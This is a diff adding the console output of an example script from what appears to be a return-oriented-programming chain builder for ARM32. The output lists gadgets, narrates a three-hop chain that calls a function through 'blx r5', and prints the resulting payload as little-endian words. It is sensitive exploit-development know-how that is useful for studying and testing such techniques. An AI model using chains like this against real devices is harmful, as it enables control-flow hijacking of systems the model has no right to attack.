@@ -1,0 +1,31 @@
+$ python3 ex13_arm32_chain.py
+gadgets:
+  0x8f00194: pop {r4, pc}
+  0x8f001d4: pop {r4, r5, pc}
+  0x8f00461: mov r0, r4; blx r5; pop {r4, r5, pc}  (Thumb)
+
+narrate(): the hop-by-hop story
+chain maint in rec (carry=Passthru)
+  hop enter: Epilogue @ 0x8f00194
+  hop load_call: LoadPair @ 0x8f001d4
+  hop unlock: CallTail @ 0x8f00461
+    needs r4 <- cell:rec.maint.load_call.r4  (-> r0, its one argument)
+    needs r5 <- cell:rec.maint.load_call.r5  (the function blx calls)
+  (finished)
+
+placements: pop {..., pc} is internal, so the three frames abut -- over=() everywhere
+  maint.enter      +0x0004..+0x000c  over=()
+  maint.load_call  +0x000c..+0x0018  over=()
+  maint.unlock     +0x0018..+0x0024  over=()
+
+seal(), then check(): every need fed, SP % 8 == 0 at the call boundary
+check: 0 errors, 0 warnings, 0 pending
+
+the final image: three frames of little-endian words (unset r4/r5 slots ride the fill)
+region rec (base=rec_va, fill=0x00)
+  +0x0008 w4 d401f008  [rec.maint.enter.pc]
+  +0x000c w4 eeffc000  [rec.maint.load_call.r4]
+  +0x0010 w4 502cf008  [rec.maint.load_call.r5]
+  +0x0014 w4 6104f008  [rec.maint.load_call.pc]
+  +0x0020 w4 103ef008  [rec.maint.unlock.pc]
+(0x8f00461 staged at +0x14: the Thumb entry, bit 0 kept -- the CPU consumes it at the branch)
